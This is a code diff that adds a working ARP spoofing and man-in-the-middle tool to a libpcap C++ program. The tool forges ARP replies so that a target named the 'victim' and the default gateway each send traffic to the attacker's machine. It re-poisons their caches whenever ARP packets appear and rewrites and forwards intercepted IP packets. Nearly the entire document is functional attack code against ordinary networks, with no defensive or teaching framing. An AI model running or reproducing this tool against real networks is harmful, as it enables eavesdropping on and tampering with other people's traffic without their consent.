@@ -10,23 +10,34 @@
 
 using namespace std;
 
-namespace
-{
-    char    g_szLastErr[PCAP_ERRBUF_SIZE] = {0};
-    
-    u_char  g_myMAC[ETH_ALEN] = {0};
-    u_char  g_victimMAC[ETH_ALEN] = {0};
-    u_char  g_gatewayMAC[ETH_ALEN] = {0};
-    in_addr g_victimIP;
-    in_addr g_gatewayIP;
-};
-
 #define MY_ASSERT(expr) \
     if (!(expr)) \
     { \
         printf("Assertion failed: %s\n", #expr); \
         return EXIT_FAILURE; \
     }
+
+#define COPY_OR_ZERO(dest, src, len) \
+    if (src) \
+        memcpy(dest, src, len); \
+    else \
+        memset(dest, 0, len);
+
+namespace
+{
+    char    g_szLastErr[PCAP_ERRBUF_SIZE] = {0};
+};
+
+typedef struct
+{
+    pcap_t* handle;
+    u_char  myMAC[ETH_ALEN];
+    u_char  victimMAC[ETH_ALEN];
+    u_char  gatewayMAC[ETH_ALEN];
+    in_addr victimIP;
+    in_addr gatewayIP;
+    bool    bInitialClaimsMade;
+} WorkingSet;
 
 typedef struct
 {
@@ -40,12 +51,6 @@ typedef struct
     u_int8_t    targetMAC[ETH_ALEN];	/* Target hardware address.  */
     u_int16_t   targetIP[2];		    /* Target IP address.  */
 } ARPPacket;
-
-#define COPY_OR_ZERO(dest, src, len) \
-    if (src) \
-        memcpy(dest, src, len); \
-    else \
-        memset(dest, 0, len);
 
 #define MAC_FORMAT "%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx"
 
@@ -128,10 +133,10 @@ int GetDefaultGateway(in_addr* pGatewayAddr)
 void WriteARP(u_char* pPacket,
               unsigned int& nPos,
               bool bRequest,
-              const u_char* pSenderMAC,
-              const char* szSenderIP,
-              const u_char* pTargetMAC,
-              const char* szTargetIP)
+              const u_char pSenderMAC[ETH_ALEN],
+              const in_addr& addrSenderIP,
+              const u_char pTargetMAC[ETH_ALEN],
+              const in_addr& addrTargetIP)
 {
     ARPPacket* pARP = reinterpret_cast<ARPPacket*>(pPacket+nPos);
     
@@ -142,24 +147,18 @@ void WriteARP(u_char* pPacket,
     pARP->opcode        = htons(bRequest?0x0001:0x0002);
     
     COPY_OR_ZERO(pARP->senderMAC, pSenderMAC, ETH_ALEN * sizeof(u_char));
-    
-    in_addr senderAddr;
-    inet_aton(szSenderIP, &senderAddr);
-    memcpy(pARP->senderIP, &senderAddr, sizeof(in_addr));
+    memcpy(pARP->senderIP, &addrSenderIP, sizeof(in_addr));
     
     COPY_OR_ZERO(pARP->targetMAC, pTargetMAC, ETH_ALEN * sizeof(u_char));
-    
-    in_addr targetAddr;
-    inet_aton(szTargetIP, &targetAddr);
-    memcpy(pARP->targetIP, &targetAddr, sizeof(in_addr));
+    memcpy(pARP->targetIP, &addrTargetIP, sizeof(in_addr));
     
     nPos += sizeof(ARPPacket);
 }             
     
 void WriteEthernet(u_char* pPacket,
                    unsigned int& nPos,
-                   const u_char* pSrc,
-                   const u_char* pDst)
+                   const u_char pSrc[ETH_ALEN],
+                   const u_char pDst[ETH_ALEN])
 {
     ether_header* pEth = reinterpret_cast<ether_header*>(pPacket+nPos);
     
@@ -170,11 +169,39 @@ void WriteEthernet(u_char* pPacket,
     nPos += sizeof(ether_header);
 }
 
-int CreateARPPacket(bool bRequest,
-                    const u_char* pSenderMAC,
-                    const string& szSenderIP,
-                    const u_char* pTargetMAC,
-                    const string& szTargetIP,
+void ChangeEthernetSrc(u_char* pPacket,
+                       const u_char myMAC[ETH_ALEN],
+                       const u_char gatewayMAC[ETH_ALEN],
+                       const u_char victimMAC[ETH_ALEN])
+{
+    ether_header* pEth = reinterpret_cast<ether_header*>(pPacket);  
+    
+/*    if (memcmp(pEth->ether_shost, gatewayMAC, ETH_ALEN) == 0)
+    {
+        printf("Packet: gateway --> victim\n");
+        COPY_OR_ZERO(pEth->ether_dhost, victimMAC, ETH_ALEN);
+    }
+    else
+    {*/
+        printf("Packet: victim --> gateway\n");
+        COPY_OR_ZERO(pEth->ether_dhost, gatewayMAC, ETH_ALEN);
+    //}
+      
+    COPY_OR_ZERO(pEth->ether_shost, myMAC, ETH_ALEN * sizeof(u_char));
+}
+
+bool IsARPPacket(const u_char* pPacket)
+{
+    const ether_header* pEth = reinterpret_cast<const ether_header*>(pPacket);
+    return (pEth->ether_type == ETHERTYPE_ARP);
+}
+
+int CreateARPPacket(WorkingSet& ws,
+                    bool bRequest,
+                    const u_char pSenderMAC[ETH_ALEN],
+                    const in_addr& addrSenderIP,
+                    const u_char pTargetMAC[ETH_ALEN],
+                    const in_addr& addrTargetIP,
                     u_char** pOutPacket, uint16_t& uOutPacketSize)
 {
     try
@@ -187,15 +214,15 @@ int CreateARPPacket(bool bRequest,
         unsigned int nOutPos=0;
         
         WriteEthernet(pPacket, nOutPos,
-                      pTargetMAC,
-                      g_myMAC);
+                      ws.myMAC,
+                      pTargetMAC);
         
         WriteARP(pPacket, nOutPos,
                  bRequest,
                  pSenderMAC,
-                 szSenderIP.c_str(),
+                 addrSenderIP,
                  pTargetMAC,
-                 szTargetIP.c_str());
+                 addrTargetIP);
                  
         *pOutPacket = pPacket;
         uOutPacketSize = uPacketSize;
@@ -207,29 +234,54 @@ int CreateARPPacket(bool bRequest,
     }
 }
 
-int InjectARPPacket(pcap_t* handle,
+int InjectARPPacket(WorkingSet& ws,
                     bool bRequest,
-                    const u_char* pSenderMAC,
-                    const string& szSenderIP,
-                    const u_char* pTargetMAC,
-                    const string& szTargetIP)
+                    const u_char pSenderMAC[ETH_ALEN],
+                    const in_addr& addrSenderIP,
+                    const u_char pTargetMAC[ETH_ALEN],
+                    const in_addr& addrTargetIP)
 {
     u_char* pARPPacket = NULL;
     u_int16_t uPacketSize = 0;
-    CreateARPPacket(bRequest, pSenderMAC, szSenderIP, pTargetMAC, szTargetIP, &pARPPacket, uPacketSize);
+    CreateARPPacket(ws, bRequest, pSenderMAC, addrSenderIP, pTargetMAC, addrTargetIP, &pARPPacket, uPacketSize);
     
-    pcap_inject(handle, reinterpret_cast<void*>(pARPPacket), uPacketSize);
-    
-    printf("ARP packet injected.\n");
+    pcap_inject(ws.handle, reinterpret_cast<void*>(pARPPacket), uPacketSize);
 }
 
-inline int ClaimIPAsOwn(pcap_t* handle,
-                        const string& szIPToClaim,
-                        const string& szDestIP)
+inline int ClaimIPAsOwn(WorkingSet& ws,
+                        const in_addr& addrIPToClaim,
+                        const in_addr& addrDestIP,
+                        u_char destMac[ETH_ALEN])
 {
-    u_char destMac[ETH_ALEN];
-    GetMACForIP(szDestIP.c_str(), destMac);
-    return InjectARPPacket(handle, false, g_myMAC, szIPToClaim, destMac, szDestIP);
+    return InjectARPPacket(ws, false, ws.myMAC, addrIPToClaim, destMac, addrDestIP);
+}
+
+inline void CreatePacketFilter(const WorkingSet& ws, string& filter)
+{
+    char buf[100];
+    sprintf(buf, "src %s or src %s", inet_ntoa(ws.victimIP), inet_ntoa(ws.gatewayIP));
+    filter = string(buf);
+}
+
+void OnPacketArrival(u_char* args, const pcap_pkthdr* pHeader, const u_char* pPacket)
+{
+    WorkingSet* pWs = reinterpret_cast<WorkingSet*>(args);
+    
+    if (IsARPPacket(pPacket))
+    {
+        printf("[OnPacketArrival] ARP Packet\n");
+        ClaimIPAsOwn(*pWs, pWs->gatewayIP, pWs->victimIP, pWs->victimMAC);
+        ClaimIPAsOwn(*pWs, pWs->victimIP, pWs->gatewayIP, pWs->gatewayMAC);  
+    }
+    else
+    {
+        printf("[OnPacketArrival] IP Packet\n");
+        u_char pModPacket[pHeader->caplen];
+        memcpy(pModPacket, pPacket, pHeader->caplen);
+        
+        ChangeEthernetSrc(pModPacket, pWs->myMAC, pWs->gatewayMAC, pWs->victimMAC);
+        pcap_inject(pWs->handle, reinterpret_cast<void*>(pModPacket), pHeader->caplen);
+    } 
 }
 
 int main(int argc, char** argv)
@@ -244,8 +296,13 @@ int main(int argc, char** argv)
         printf("  Treat [ip-addr] as the gateway. If not specified, will try to auto-detect.\n");
         return EXIT_FAILURE;
     }
+
+    WorkingSet ws;
+    memset(&ws, 0, sizeof(WorkingSet));
     
-    const char* szVictimIP = argv[1];
+    inet_aton(argv[1], &(ws.victimIP));
+    printf("Victim: %s\n", inet_ntoa(ws.victimIP));
+    
     const char* szDevice   = NULL;
     
     for (uint8_t i=2; i<argc; i++)
@@ -259,35 +316,41 @@ int main(int argc, char** argv)
         
     MY_ASSERT(szDevice);
     printf("Listening on %s\n", szDevice);
-    printf("Victim: %s\n", szVictimIP);
     
-    in_addr defaultGateway;
-    GetDefaultGateway(&defaultGateway);
-    printf("Default Gateway: %s\n", inet_ntoa(defaultGateway));
+    GetDefaultGateway(&(ws.gatewayIP));
+    GetMACForIP(inet_ntoa(ws.gatewayIP), ws.gatewayMAC);
+    printf("Default Gateway: %s\n", inet_ntoa(ws.gatewayIP));
     
     bpf_u_int32 net;
     bpf_u_int32 mask;
     MY_ASSERT(pcap_lookupnet(szDevice, &net, &mask, g_szLastErr) != -1);
     
-    pcap_t* handle = pcap_open_live(szDevice, BUFSIZ, 1, -1, g_szLastErr);
-    MY_ASSERT(handle);
+    ws.handle = pcap_open_live(szDevice, BUFSIZ, 1, -1, g_szLastErr);
+    MY_ASSERT(ws.handle);
     
-    /* Test code */
-    
-    u_char macAddr[ETH_ALEN] = {0};
-    GetMACForIP(szVictimIP, macAddr);
+    GetMACForIP(inet_ntoa(ws.victimIP), ws.victimMAC);
     
     char macAddrStr[18] = {0};
-    mac_ntoa(macAddr, macAddrStr);
+    mac_ntoa(ws.victimMAC, macAddrStr);
     printf("victim MAC address=[%s]\n", macAddrStr);
     
-    GetMACForDevice(szDevice, g_myMAC);
+    GetMACForDevice(szDevice, ws.myMAC);
     
     char myMACStr[18] = {0};
-    mac_ntoa(g_myMAC, myMACStr);
+    mac_ntoa(ws.myMAC, myMACStr);
     printf("my MAC address=[%s]\n", myMACStr);
     
-    /* END Test code */
+    string filter;
+    CreatePacketFilter(ws, filter);
+    
+    bpf_program fp;
+    MY_ASSERT(pcap_compile(ws.handle, &fp, filter.c_str(), 0, net) != -1);
+    
+    MY_ASSERT(pcap_setfilter(ws.handle, &fp) != -1);
+    
+    ClaimIPAsOwn(ws, ws.gatewayIP, ws.victimIP, ws.victimMAC);
+    ClaimIPAsOwn(ws, ws.victimIP, ws.gatewayIP, ws.gatewayMAC);
+    MY_ASSERT(pcap_loop(ws.handle, -1, OnPacketArrival, reinterpret_cast<u_char*>(&ws)) != -1);
     
     return 0;
 }
